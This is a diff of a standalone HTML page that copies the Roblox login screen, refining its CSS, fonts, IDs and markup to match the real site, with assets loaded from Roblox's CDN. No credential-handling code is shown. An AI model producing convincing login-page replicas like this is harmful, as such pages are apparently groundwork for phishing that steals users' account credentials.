@@ -6,161 +6,215 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="author" content="Roblox Corporation">
 <meta name="description" content="Login to your Roblox account or sign up to create a new account.">
-<meta http-equiv="Content-Security-Policy" content="default-src 'none'; font-src 'self' data:; img-src 'self' data: https:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; font-src 'self' data: https:; img-src 'self' data: https:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;">
 <link rel="icon" href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico">
 <style>
+/* ============================================================
+   FONTS  (real Builder Sans, straight from Roblox's CDN)
+   ============================================================ */
+@font-face{font-family:"Builder Sans";font-style:normal;font-weight:400;font-display:swap;src:url(https://css.rbxcdn.com/5f8b8d5d1962b747.woff2) format("woff2")}
+@font-face{font-family:"Builder Sans";font-style:normal;font-weight:500;font-display:swap;src:url(https://css.rbxcdn.com/7f3ddcb5a3796526.woff2) format("woff2")}
+@font-face{font-family:"Builder Sans";font-style:normal;font-weight:700;font-display:swap;src:url(https://css.rbxcdn.com/3e19a797e2ce0522.woff2) format("woff2")}
+@font-face{font-family:"Builder Sans";font-style:normal;font-weight:800;font-display:swap;src:url(https://css.rbxcdn.com/be234b98e1d313a5.woff2) format("woff2")}
+
+/* ============================================================
+   TOKENS  (dark theme values)
+   ============================================================ */
+:root{
+    --color-surface-0:#101114;
+    --color-surface-100:#191a1f;
+    --color-surface-200:#232527;
+    --color-surface-300:#272930;
+    --color-shift-200:#393c45;
+    --color-stroke-default:rgba(255,255,255,.2);
+    --color-stroke-strong:rgba(255,255,255,.35);
+    --color-content-emphasis:#ffffff;
+    --color-content-default:#e0e0e0;
+    --color-content-muted:#d3d3d3;
+    --color-action-emphasis:#00a2ff;
+    --color-action-emphasis-hover:#32b5ff;
+    --color-selection-start:#168dd8;
+}
+
 /* ============================================================
    RESET / BASE
    ============================================================ */
 *,*::before,*::after{box-sizing:border-box}
 html{-webkit-text-size-adjust:100%;min-height:100%}
-body{margin:0;min-width:320px;min-height:100vh;font-family:"HCo Gotham SSm","Helvetica Neue",Helvetica,Arial,sans-serif;font-size:16px;font-weight:400;line-height:1.4em;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;color:#e0e0e0;background:#191a1f}
+body{
+    margin:0;min-width:320px;min-height:100vh;
+    font-family:"Builder Sans","Helvetica Neue",Helvetica,Arial,"Lucida Grande",sans-serif;
+    font-size:16px;font-weight:400;line-height:1.4em;
+    text-rendering:auto;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
+    color:var(--color-content-default);background:var(--color-surface-100);
+}
 h1{margin:0;padding:0}
 a{text-decoration:none;color:inherit}
 a:focus,a:hover{cursor:pointer}
 ul{margin:0;padding:0;list-style:none}
-button,input{font:inherit;margin:0}
+button,input{font:inherit;margin:0;font-family:inherit}
 button{overflow:visible;text-transform:none;-webkit-appearance:button}
 .sr-only{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0,0,0,0);border:0}
 .sf-hidden{display:none!important}
-:focus-visible{outline:2px solid #168dd8;outline-offset:2px}
+:focus-visible{outline:2px solid var(--color-selection-start);outline-offset:2px}
 
 /* ============================================================
    NAVBAR
    ============================================================ */
-.rbx-header{position:fixed;top:0;left:0;right:0;z-index:1030;height:40px;background:#191a1f;border-bottom:1px solid rgba(255,255,255,.08)}
+.rbx-header{
+    position:fixed;top:0;left:0;right:0;z-index:1030;height:40px;
+    background:var(--color-surface-100);
+    border-bottom:1px solid var(--color-surface-200);
+}
 .rbx-header .container-fluid{display:flex;align-items:center;height:100%;padding:0 12px}
-.navbar-header{float:left}
+
+.navbar-header{display:flex;align-items:center;flex:0 0 auto}
 .navbar-brand{display:flex;align-items:center;height:40px}
-.icon-logo{display:none;width:118px;height:30px;background-repeat:no-repeat;background-size:118px 30px;background-image:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIwIiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMzIwIDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0zOC41Nzk2IDM4LjQwNDNMNDcuNzkwNiA1NS4yNjI2SDMwLjY5OTlMMjIuOTIyNiA0MC44NTU2SDE1LjU1NDZWNTUuMjYyNkgwVjQuMTkzMDhIMjguNDQ4NkM0MC4yMTY5IDQuMTkzMDggNDcuNjg4MyAxMC43MjQ2IDQ3LjY4ODMgMjIuNDcwNkM0Ny42ODgzIDMwLjAyODkgNDQuMjA5IDM1LjQ0MzMgMzguNTc5NiAzOC40MDQzWk0xNS41NTQ2IDE3LjQ2NThWMjcuNTc3NUgyNi42MDY2QzI5Ljg4MTMgMjcuNTc3NSAzMS45Mjc5IDI1LjYzNjkgMzEuOTI3OSAyMi40NzA2QzMxLjkyNzkgMTkuMzA0MyAyOS44ODEzIDE3LjQ2NTggMjYuNjA2NiAxNy40NjU4SDE1LjU1NDZaTTk3LjIxNzUgNTkuMDM3NEw1MC42NTYgNDYuNDc0M0w2My4xNDA2IDBMODYuNDIxNCA2LjI4MTU1TDEwOS43MDIgMTIuNTYzMUw5Ny4yMTc1IDU5LjAzNzRaTTg4LjQxNjkgMjQuODE5OEw3NS40MjA2IDIxLjI0NDlMNzEuOTQxMyAzNC4yMTY2TDg0LjkzNzYgMzcuNzkyNUw4OC40MTY5IDI0LjgxOThaTTE2My4wMTkgNDAuODU1NkMxNjMuMDE5IDUwLjY2MSAxNTYuNzc3IDU1LjI2MjYgMTQ3LjA1NSA1NS4yNjI2SDExNi41NlY0LjE5MzA4SDE0Ni4wMzJDMTU1Ljc1MyA0LjE5MzA4IDE2MS45OTUgOS4xOTc4OSAxNjEuOTk1IDE3Ljk4MThDMTYxLjk5NSAyMy40OTczIDE1OS45NDkgMjcuMTc1NCAxNTYuMDYgMjkuNzI4OUMxNjAuNDYxIDMxLjY2MzEgMTYzLjAxOSAzNS41NDU1IDE2My4wMTkgNDAuODU1NlpNMTMxLjcwNSAxNi40NDk4VjI0LjAwOEgxNDEuODNDMTQ0LjU5MyAyNC4wMDggMTQ2LjIzMSAyMi43ODI0IDE0Ni4yMzEgMjAuMTI2OEMxNDYuMjMxIDE3LjY3NTQgMTQ0LjU5MyAxNi40NDk4IDE0MS44MyAxNi40NDk4SDEzMS43MDVaTTEzMS43MDUgNDMuMDA1OUgxNDMuMDY0QzE0NS43MjUgNDMuMDA1OSAxNDcuMjY1IDQxLjU3NiAxNDcuMjY1IDM5LjEyMzVDMTQ3LjI2NSAzNi40NjkgMTQ1LjczIDM1LjI0MzMgMTQzLjA2NCAzNS4yNDMzSDEzMS43MDVWNDMuMDA1OVpNMTcwLjY5NCA0LjE5MzA4SDE4Ni4yNDZWNDAuMTQxN0gyMDguNTU1VjU1LjI2MjZIMTcwLjY5MkwxNzAuNjk0IDQuMTkzMDhaTTI2NS43NjIgMjkuNzI4OUMyNjUuNzYyIDM0Ljk4MTIgMjY0LjIwMiA0MC4xMTU2IDI2MS4yNzggNDQuNDgyN0MyNTguMzU1IDQ4Ljg0OTggMjU0LjE5OSA1Mi4yNTM2IDI0OS4zMzggNTQuMjYzNkMyNDQuNDc2IDU2LjI3MzYgMjM5LjEyNiA1Ni43OTk1IDIzMy45NjUgNTUuNzc0OEMyMjguODA0IDU0Ljc1MDEgMjI0LjA2MyA1Mi4yMjA5IDIyMC4zNDIgNDguNTA2OUMyMTYuNjIxIDQ0Ljc5MyAyMTQuMDg3IDQwLjA2MTEgMjEzLjA2IDM0LjkwOThDMjEyLjAzNCAyOS43NTg0IDIxMi41NjEgMjQuNDE4OCAyMTQuNTc0IDE5LjU2NjNDMjE2LjU4OCAxNC43MTM4IDIxOS45OTggMTAuNTY2MyAyMjQuMzc0IDcuNjQ4MjhDMjI4Ljc0OSA0LjczMDI1IDIzMy44OTMgMy4xNzI3NiAyMzkuMTU2IDMuMTcyNzZDMjQyLjY1MSAzLjE2NTgyIDI0Ni4xMTQgMy44NDc4IDI0OS4zNDUgNS4xNzk1OEMyNTIuNTc1IDYuNTExMzUgMjU1LjUxMSA4LjQ2NjcyIDI1Ny45ODMgMTAuOTMzNUMyNjAuNDU1IDEzLjQwMDMgMjYyLjQxNSAxNi4zMjk5IDI2My43NSAxOS41NTQ0QzI2NS4wODUgMjIuNzc4OCAyNjUuNzY5IDI2LjIzNDYgMjY1Ljc2MiAyOS43MjM1VjI5LjcyODlaTTI1MC4yMDggMjkuNzI4OUMyNTAuMjA4IDIzLjM5NTIgMjQ1LjE5MyAxOC4zOTA0IDIzOS4xNTYgMTguMzkwNEMyMzMuMTE4IDE4LjM5MDQgMjI4LjEwMyAyMy4zOTUyIDIyOC4xMDMgMjkuNzI4OUMyMjguMTAzIDM2LjA2MjYgMjMzLjExOCA0MS4wNjYzIDIzOS4xNTYgNDEuMDY2M0MyNDUuMTkzIDQxLjA2NjMgMjUwLjIwOCAzNi4wNTUxIDI1MC4yMDggMjkuNzIzNVYyOS43Mjg5Wk0zMDMuMjE2IDI4LjkxMDdMMzIwIDU1LjI2MjZIMzAxLjQ3MkwyOTIuMjY3IDQwLjI0MjhMMjgyLjc1IDU1LjI2MjZIMjYzLjkyTDI4MS40MTkgMjkuNTIyNUwyNjUuMzUzIDQuMTkzMDhIMjgzLjg3NUwyOTIuMzY5IDE3Ljk4MThMMzAwLjU1NiA0LjE5MzA4SDMxOC45NzZMMzAzLjIxNiAyOC45MTA3WiIgZmlsbD0iI2UwZTBlMCIvPjwvc3ZnPg==")}
+.icon-logo{
+    display:none;width:118px;height:30px;background-repeat:no-repeat;background-position:0 0;background-size:118px 30px;
+    background-image:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIwIiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMzIwIDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0zOC41Nzk2IDM4LjQwNDNMNDcuNzkwNiA1NS4yNjI2SDMwLjY5OTlMMjIuOTIyNiA0MC44NTU2SDE1LjU1NDZWNTUuMjYyNkgwVjQuMTkzMDhIMjguNDQ4NkM0MC4yMTY5IDQuMTkzMDggNDcuNjg4MyAxMC43MjQ2IDQ3LjY4ODMgMjIuNDcwNkM0Ny42ODgzIDMwLjAyODkgNDQuMjA5IDM1LjQ0MzMgMzguNTc5NiAzOC40MDQzWk0xNS41NTQ2IDE3LjQ2NThWMjcuNTc3NUgyNi42MDY2QzI5Ljg4MTMgMjcuNTc3NSAzMS45Mjc5IDI1LjYzNjkgMzEuOTI3OSAyMi40NzA2QzMxLjkyNzkgMTkuMzA0MyAyOS44ODEzIDE3LjQ2NTggMjYuNjA2NiAxNy40NjU4SDE1LjU1NDZaTTk3LjIxNzUgNTkuMDM3NEw1MC42NTYgNDYuNDc0M0w2My4xNDA2IDBMODYuNDIxNCA2LjI4MTU1TDEwOS43MDIgMTIuNTYzMUw5Ny4yMTc1IDU5LjAzNzRaTTg4LjQxNjkgMjQuODE5OEw3NS40MjA2IDIxLjI0NDlMNzEuOTQxMyAzNC4yMTY2TDg0LjkzNzYgMzcuNzkyNUw4OC40MTY5IDI0LjgxOThaTTE2My4wMTkgNDAuODU1NkMxNjMuMDE5IDUwLjY2MSAxNTYuNzc3IDU1LjI2MjYgMTQ3LjA1NSA1NS4yNjI2SDExNi41NlY0LjE5MzA4SDE0Ni4wMzJDMTU1Ljc1MyA0LjE5MzA4IDE2MS45OTUgOS4xOTc4OSAxNjEuOTk1IDE3Ljk4MThDMTYxLjk5NSAyMy40OTczIDE1OS45NDkgMjcuMTc1NCAxNTYuMDYgMjkuNzI4OUMxNjAuNDYxIDMxLjY2MzEgMTYzLjAxOSAzNS41NDU1IDE2My4wMTkgNDAuODU1NlpNMTMxLjcwNSAxNi40NDk4VjI0LjAwOEgxNDEuODNDMTQ0LjU5MyAyNC4wMDggMTQ2LjIzMSAyMi43ODI0IDE0Ni4yMzEgMjAuMTI2OEMxNDYuMjMxIDE3LjY3NTQgMTQ0LjU5MyAxNi40NDk4IDE0MS44MyAxNi40NDk4SDEzMS43MDVaTTEzMS43MDUgNDMuMDA1OUgxNDMuMDY0QzE0NS43MjUgNDMuMDA1OSAxNDcuMjY1IDQxLjU3NiAxNDcuMjY1IDM5LjEyMzVDMTQ3LjI2NSAzNi40NjkgMTQ1LjczIDM1LjI0MzMgMTQzLjA2NCAzNS4yNDMzSDEzMS43MDVWNDMuMDA1OVpNMTcwLjY5NCA0LjE5MzA4SDE4Ni4yNDZWNDAuMTQxN0gyMDguNTU1VjU1LjI2MjZIMTcwLjY5MkwxNzAuNjk0IDQuMTkzMDhaTTI2NS43NjIgMjkuNzI4OUMyNjUuNzYyIDM0Ljk4MTIgMjY0LjIwMiA0MC4xMTU2IDI2MS4yNzggNDQuNDgyN0MyNTguMzU1IDQ4Ljg0OTggMjU0LjE5OSA1Mi4yNTM2IDI0OS4zMzggNTQuMjYzNkMyNDQuNDc2IDU2LjI3MzYgMjM5LjEyNiA1Ni43OTk1IDIzMy45NjUgNTUuNzc0OEMyMjguODA0IDU0Ljc1MDEgMjI0LjA2MyA1Mi4yMjA5IDIyMC4zNDIgNDguNTA2OUMyMTYuNjIxIDQ0Ljc5MyAyMTQuMDg3IDQwLjA2MTEgMjEzLjA2IDM0LjkwOThDMjEyLjAzNCAyOS43NTg0IDIxMi41NjEgMjQuNDE4OCAyMTQuNTc0IDE5LjU2NjNDMjE2LjU4OCAxNC43MTM4IDIxOS45OTggMTAuNTY2MyAyMjQuMzc0IDcuNjQ4MjhDMjI4Ljc0OSA0LjczMDI1IDIzMy44OTMgMy4xNzI3NiAyMzkuMTU2IDMuMTcyNzZDMjQyLjY1MSAzLjE2NTgyIDI0Ni4xMTQgMy44NDc4IDI0OS4zNDUgNS4xNzk1OEMyNTIuNTc1IDYuNTExMzUgMjU1LjUxMSA4LjQ2NjcyIDI1Ny45ODMgMTAuOTMzNUMyNjAuNDU1IDEzLjQwMDMgMjYyLjQxNSAxNi4zMjk5IDI2My43NSAxOS41NTQ0QzI2NS4wODUgMjIuNzc4OCAyNjUuNzY5IDI2LjIzNDYgMjY1Ljc2MiAyOS43MjM1VjI5LjcyODlaTTI1MC4yMDggMjkuNzI4OUMyNTAuMjA4IDIzLjM5NTIgMjQ1LjE5MyAxOC4zOTA0IDIzOS4xNTYgMTguMzkwNEMyMzMuMTE4IDE4LjM5MDQgMjI4LjEwMyAyMy4zOTUyIDIyOC4xMDMgMjkuNzI4OUMyMjguMTAzIDM2LjA2MjYgMjMzLjExOCA0MS4wNjYzIDIzOS4xNTYgNDEuMDY2M0MyNDUuMTkzIDQxLjA2NjMgMjUwLjIwOCAzNi4wNTUxIDI1MC4yMDggMjkuNzIzNVYyOS43Mjg5Wk0zMDMuMjE2IDI4LjkxMDdMMzIwIDU1LjI2MjZIMzAxLjQ3MkwyOTIuMjY3IDQwLjI0MjhMMjgyLjc1IDU1LjI2MjZIMjYzLjkyTDI4MS40MTkgMjkuNTIyNUwyNjUuMzUzIDQuMTkzMDhIMjgzLjg3NUwyOTIuMzY5IDE3Ljk4MThMMzAwLjU1NiA0LjE5MzA4SDMxOC45NzZMMzAzLjIxNiAyOC45MTA3WiIgZmlsbD0iI2UwZTBlMCIvPjwvc3ZnPg==")
+}
 @media(min-width:1688px){.rbx-header .navbar-header{padding:0 12px}.rbx-header .icon-logo{display:block}}
 
-.rbx-navbar{display:flex;align-items:center;gap:2px;margin:0 8px}
-.rbx-navbar li{list-style:none}
-.nav-menu-title{display:inline-block;padding:6px 9px;font-size:16px;font-weight:500;color:#e0e0e0;white-space:nowrap}
-.nav-menu-title:hover{color:#fff;background:rgba(255,255,255,.06);border-radius:6px}
+/* nav block = col-lg-4 (33.33%), items grow evenly and centre */
+.rbx-navbar{display:flex;flex:0 1 33.3333%;min-width:0;margin:4px 0}
+.rbx-navbar li{flex:1 1 0;min-width:0;text-align:center;border-bottom:2px solid transparent}
+.rbx-navbar li:hover{border-bottom-color:var(--color-content-emphasis)}
+.nav-menu-title{
+    -webkit-user-select:none;user-select:none;
+    display:inline-block;width:100%;padding:6px 9px;
+    font-size:16px;font-weight:500;white-space:nowrap;
+    color:var(--color-content-default);
+}
+.nav-menu-title:focus,.nav-menu-title:hover{color:var(--color-content-emphasis);background:transparent}
 
-.navbar-search{position:relative;flex:1;max-width:420px;margin:0 12px}
-.navbar-search .input-group{display:flex;align-items:center;height:28px;background:#2a2d35;border:1px solid rgba(255,255,255,.15);border-radius:8px;overflow:hidden}
-.navbar-search input[type=search]{flex:1;height:100%;min-width:0;padding:0 8px 0 33px;background:transparent;border:0;outline:0;color:#e0e0e0;font-size:14px}
+/* search = col-lg-3 (25%) */
+.navbar-search{position:relative;flex:0 1 25%;max-width:465px;min-width:0;margin:0 12px 0 24px}
+.navbar-search .input-group{
+    display:flex;align-items:center;height:28px;overflow:hidden;
+    background:var(--color-surface-0);border:1px solid var(--color-stroke-default);border-radius:8px;
+}
+.navbar-search input[type=search]{
+    flex:1;min-width:0;height:100%;padding:0 8px 0 33px;
+    background:transparent;border:0;outline:0;color:var(--color-content-default);font-size:14px;
+}
 .navbar-search input[type=search]::placeholder{color:rgba(224,224,224,.5)}
-.navbar-search .input-addon-btn{position:absolute;left:0;top:0;height:28px;width:30px;display:flex;align-items:center;justify-content:center;background:transparent;border:0;cursor:pointer;color:#e0e0e0;opacity:.7}
-.icon-common-search-sm{width:18px;height:18px;background-repeat:no-repeat;background-size:contain;background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZTBlMGUwIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCI+PGNpcmNsZSBjeD0iMTAuNSIgY3k9IjEwLjUiIHI9IjYuNSIvPjxwYXRoIGQ9Ik0xNS41IDE1LjVMMjEgMjEiLz48L3N2Zz4=")}
-@media(max-width:900px){.rbx-navbar{display:none}}
+.navbar-search .input-addon-btn{
+    position:absolute;left:0;top:0;width:30px;height:28px;
+    display:flex;align-items:center;justify-content:center;
+    background:transparent;border:0;cursor:pointer;color:var(--color-content-default);opacity:.7;
+}
+.icon-common-search-sm{
+    width:18px;height:18px;background-repeat:no-repeat;background-size:contain;
+    background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZTBlMGUwIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCI+PGNpcmNsZSBjeD0iMTAuNSIgY3k9IjEwLjUiIHI9IjYuNSIvPjxwYXRoIGQ9Ik0xNS41IDE1LjVMMjEgMjEiLz48L3N2Zz4=");
+}
 
-.rbx-navbar-right{margin-left:auto;display:flex;align-items:center;gap:10px}
-.rbx-navbar-signup{display:inline-block;padding:6px 14px;font-size:15px;font-weight:600;color:#fff;background:#00a2ff;border:1px solid #00a2ff;border-radius:8px;white-space:nowrap;transition:background-color .12s ease}
+.rbx-navbar-right{margin-left:auto;margin-right:12px;display:flex;align-items:center}
+.rbx-navbar-signup{
+    display:inline-block;padding:7px 14px;font-size:16px;font-weight:500;line-height:100%;
+    color:#fff;background:var(--color-action-emphasis);
+    border:1px solid var(--color-action-emphasis);border-radius:8px;white-space:nowrap;
+}
 .rbx-navbar-signup:link,.rbx-navbar-signup:visited{color:#fff}
-.rbx-navbar-signup:focus,.rbx-navbar-signup:hover{background:#32b5ff;border-color:#32b5ff;color:#fff}
+.rbx-navbar-signup:focus,.rbx-navbar-signup:hover{background:var(--color-action-emphasis-hover);border-color:var(--color-action-emphasis-hover);color:#fff}
+
+@media(max-width:991px){
+    .rbx-navbar{flex-basis:auto;margin:4px 8px}
+    .navbar-search{flex-basis:auto;flex-grow:1;margin-left:8px}
+}
+@media(max-width:767px){
+    .rbx-navbar{display:none}
+    .navbar-search{display:none}
+}
 
 /* ============================================================
-   BACKGROUND  (hosted Roblox CDN asset - swap this URL if you like)
+   BACKGROUND  (hosted asset - swap this URL if you like)
    ============================================================ */
 .background-image{
     background:
         radial-gradient(circle, rgba(0,0,0,.5) 60%, rgba(0,0,0,.75) 100%),
         url('https://images.rbxcdn.com/de4e698b86f73bc5.jpg') 50% / cover no-repeat fixed;
-    min-height:100vh;
-    width:100%;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    padding:64px 12px 40px;
+    min-height:100vh;width:100%;display:flex;align-items:center;justify-content:center;
 }
+.login-content-wrapper{display:flex;flex-direction:column;align-items:center;min-height:600px;width:100%}
+.login-base-container{
+    width:100%;max-width:400px;padding:0 24px;
+    display:flex;align-items:center;justify-content:center;
+}
+@media(max-width:543px){.login-base-container{padding:0 12px}}
 
 /* ============================================================
    LOGIN CARD
    ============================================================ */
-.login-content-wrapper{width:100%;display:flex;justify-content:center}
-.login-base-container{width:400px;max-width:100%}
-
 .section-content.login-section{
-    position:relative;
-    background:#272930;
-    color:#e0e0e0;
-    border-radius:8px;
-    padding:28px 30px;
-    box-shadow:0 18px 50px rgba(0,0,0,.55);
+    position:relative;width:100%;
+    background:var(--color-surface-300);color:var(--color-content-emphasis);
+    border-radius:8px;padding:15px;margin:0;
 }
-
-.login-header{margin-bottom:18px;text-align:center;font-size:32px;font-weight:800;color:#fff}
+.login-header{margin-bottom:18px;text-align:center;font-size:32px;font-weight:800;line-height:1.4em;padding:5px 0;color:var(--color-content-emphasis)}
+@media(max-width:767px){.login-header{font-size:24px}}
 
 .form-group{margin-bottom:16px}
+.username-form-group{margin-bottom:18px}
 .password-form-group{margin-bottom:0}
+
 .input-field{
     display:block;width:100%;height:38px;padding:5px 12px;
-    font-size:16px;font-weight:400;
-    color:#e0e0e0;background:#393c45;
-    border:1px solid rgba(255,255,255,.2);border-radius:8px;
+    font-size:16px;font-weight:400;line-height:100%;
+    background:var(--color-shift-200);color:var(--color-content-default);
+    border:1px solid var(--color-stroke-default);border-radius:8px;
     box-shadow:none;-webkit-appearance:none;outline:0;
 }
-.input-field::placeholder{color:rgba(224,224,224,.5);font-weight:300}
-.input-field:focus{background:#393c45;border-color:rgba(255,255,255,.45)}
+.input-field::placeholder{color:var(--color-content-default);opacity:1;font-weight:400}
+.input-field:focus{background:var(--color-shift-200);border-color:var(--color-stroke-strong);box-shadow:none}
 
-/* primary button */
-.btn-secondary-md{
+/* --- buttons: secondary + control are the same quiet outline in dark theme --- */
+.btn-secondary-md,.btn-control-md{
     -webkit-user-select:none;user-select:none;
-    display:inline-block;width:100%;padding:11px 9px;
-    font-size:16px;font-weight:700;line-height:100%;text-align:center;
-    color:#fff;background:#00a2ff;border:1px solid #00a2ff;border-radius:8px;
-    cursor:pointer;transition:background-color .12s ease,border-color .12s ease;
+    display:inline-block;width:100%;padding:9px;
+    font-size:16px;font-weight:500;line-height:100%;text-align:center;white-space:nowrap;
+    background:transparent;border:1px solid var(--color-stroke-strong);
+    color:var(--color-content-muted);border-radius:8px;cursor:pointer;
+    transition:border-color .12s ease,color .12s ease;
 }
-.btn-secondary-md:link,.btn-secondary-md:visited{color:#fff}
-.btn-secondary-md:focus,.btn-secondary-md:hover{background:#32b5ff;border-color:#32b5ff;color:#fff}
-.btn-secondary-md:disabled{opacity:.75;cursor:default}
-.login-button{margin:10px 0 12px}
+.btn-secondary-md:link,.btn-secondary-md:visited,
+.btn-control-md:link,.btn-control-md:visited{color:var(--color-content-muted)}
+.btn-secondary-md:focus,.btn-secondary-md:hover,
+.btn-control-md:focus,.btn-control-md:hover{border-color:var(--color-content-emphasis);color:var(--color-content-emphasis);background:transparent}
+.btn-secondary-md:disabled{opacity:.5;cursor:not-allowed}
+.login-button{margin:6px 0 12px}
 
-/* secondary buttons */
-.btn-control-md{
-    -webkit-user-select:none;user-select:none;
-    display:inline-block;width:100%;padding:11px 9px;
-    font-size:16px;font-weight:500;line-height:100%;text-align:center;
-    color:#e0e0e0;background:transparent;border:1px solid rgba(255,255,255,.25);border-radius:8px;
-    cursor:pointer;transition:background-color .12s ease,border-color .12s ease;
-}
-.btn-control-md:link,.btn-control-md:visited{color:#e0e0e0}
-.btn-control-md:focus,.btn-control-md:hover{background:rgba(255,255,255,.08);border-color:rgba(255,255,255,.45);color:#fff}
-.otp-login-button{margin-bottom:10px}
-.cross-device-login-button{margin-bottom:10px}
-
-/* links */
-.text-link,.text-link:link,.text-link:visited{color:#fff}
-.text-link:focus,.text-link:hover{color:#cfe9ff;text-decoration:underline}
+/* --- links --- */
+.text-link,.text-link:link,.text-link:visited{color:var(--color-content-emphasis)}
+.text-link:focus,.text-link:hover{color:var(--color-content-emphasis);text-decoration:underline}
 .forgot-credentials-link{margin-top:12px;font-size:16px;font-weight:300;text-align:center}
 
-/* divider */
+/* --- divider --- */
 .alternative-login-divider-container{position:relative;margin-bottom:6px}
 .alternative-login-divider{height:1px;margin:24px 0 0;background:rgba(255,255,255,.1)}
 .divider-text-container{position:relative;top:-13px;text-align:center}
-.divider-text{display:inline-block;padding:12px;background:#272930;color:rgba(255,255,255,.5);font-size:15px}
+.divider-text{display:inline-block;padding:12px;font-size:10px;font-weight:500;background:var(--color-surface-300);color:rgba(255,255,255,.5)}
+
+.otp-login-button{margin-top:12px;margin-bottom:6px}
+.cross-device-login-button{margin-top:6px;margin-bottom:10px}
 
 .signup-option{margin:24px 0;text-align:center}
 .no-account-text{font-weight:400}
 .signup-link{margin-left:6px;color:#5b8dd9!important;font-weight:500}
 
-/* close (x) */
-.close-login-button{position:absolute;top:8px;right:10px;padding:4px 6px;background:transparent;border:0;border-radius:6px;color:rgba(255,255,255,.55);font-size:22px;line-height:1;cursor:pointer}
-.close-login-button:hover{color:#fff;background:rgba(255,255,255,.08)}
-
 /* ============================================================
    FOOTER
    ============================================================ */
-.container-footer{background:#191a1f;border-top:1px solid rgba(255,255,255,.08);padding:12px}
+.container-footer{background:var(--color-surface-100);border-top:1px solid var(--color-surface-200);padding:12px}
 .footer{max-width:970px;margin:0 auto;text-align:center}
 .footer-links{display:flex;flex-wrap:wrap;justify-content:center;gap:6px 20px;margin:8px 0 16px}
 .text-footer-nav{color:#b8b8b8;font-size:16px;font-weight:500}
-.text-footer-nav:focus,.text-footer-nav:hover{color:#fff}
+.text-footer-nav:focus,.text-footer-nav:hover{color:var(--color-content-emphasis)}
 .footer-note{color:#606162;font-size:12px;margin:0}
-
-@media(max-width:543px){
-    .login-header{font-size:24px}
-    .section-content.login-section{padding:22px 20px}
-    .background-image{padding:56px 10px 24px}
-}
 </style>
 </head>
 
-<body class="rbx-body dark-theme theme-roblox builder-font">
+<body id="rbx-body" class="rbx-body color-mode-dark dark-theme forced-theme theme-roblox builder-font">
 
 <!-- ===================== NAVBAR ===================== -->
 <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
@@ -172,10 +226,10 @@ button{overflow:visible;text-transform:none;-webkit-appearance:button}
         </div>
 
         <ul class="nav rbx-navbar">
-            <li><a class="nav-menu-title" href="https://www.roblox.com/charts">Charts</a></li>
-            <li><a class="nav-menu-title" href="https://www.roblox.com/catalog">Marketplace</a></li>
-            <li><a class="nav-menu-title" href="https://create.roblox.com/">Create</a></li>
-            <li><a class="nav-menu-title" href="https://www.roblox.com/upgrades/robux">Robux</a></li>
+            <li><a id="nav-charts-md-link" class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/charts">Charts</a></li>
+            <li><a id="nav-marketplace-md-link" class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/catalog">Marketplace</a></li>
+            <li><a id="header-develop-md-link" class="font-header-2 nav-menu-title text-header" href="https://create.roblox.com/">Create</a></li>
+            <li><a id="nav-robux-link" class="font-header-2 nav-menu-title text-header robux-menu-btn" href="https://www.roblox.com/upgrades/robux">Robux</a></li>
         </ul>
 
         <div class="navbar-search" role="search">
@@ -184,78 +238,81 @@ button{overflow:visible;text-transform:none;-webkit-appearance:button}
                     <button class="input-addon-btn" type="submit" aria-label="Search">
                         <span class="icon-common-search-sm" aria-hidden="true"></span>
                     </button>
-                    <input type="search" name="search-bar" placeholder="Search" maxlength="120" autocomplete="off">
+                    <input id="navbar-search-input" type="search" name="search-bar" class="form-control input-field"
+                           placeholder="Search" maxlength="120" autocomplete="off">
                 </div>
             </form>
         </div>
 
-        <div class="rbx-navbar-right">
-            <a href="https://www.roblox.com/account/signupredir" id="sign-up-button" class="rbx-navbar-signup">Sign Up</a>
+        <div class="navbar-right rbx-navbar-right">
+            <a href="https://www.roblox.com/account/signupredir" id="sign-up-button" class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button">Sign Up</a>
         </div>
     </div>
 </div>
 
 <!-- ===================== LOGIN ===================== -->
-<main class="container-main">
-    <div id="react-login-web-app" class="login-container">
-        <div id="background-image" class="background-image marketing-background-2">
-            <div class="login-content-wrapper">
-                <div id="login-base" class="login-base-container">
+<main class="container-main" id="container-main">
+    <div class="content" id="content">
+        <div id="react-login-web-app" class="login-container">
+            <div id="background-image" class="background-image marketing-background-2">
+                <div class="login-content-wrapper">
+                    <div id="login-base" class="login-base-container">
 
-                    <div class="section-content login-section" data-testid="login-password-form">
+                        <div class="section-content login-section" data-testid="login-password-form">
 
